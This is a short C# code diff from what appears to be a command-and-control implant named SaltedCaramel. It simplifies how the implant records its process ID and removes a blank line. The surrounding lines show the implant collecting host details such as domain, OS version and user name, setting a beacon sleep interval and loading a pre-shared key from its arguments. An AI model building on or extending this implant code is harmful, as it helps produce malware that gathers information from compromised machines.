@@ -25,11 +25,9 @@ namespace SaltedCaramel
             implant.domain = Environment.UserDomainName;
             implant.os = Environment.OSVersion.VersionString;
             implant.architecture = "x64";
-            using (Process proc = Process.GetCurrentProcess())
-                implant.pid = proc.Id;
+            implant.pid = Process.GetCurrentProcess().Id;
             implant.sleep = 5000;
             implant.user = Environment.UserName;
-
             implant.PSK = Convert.FromBase64String(args[1]);
 
             implant.InitializeImplant();
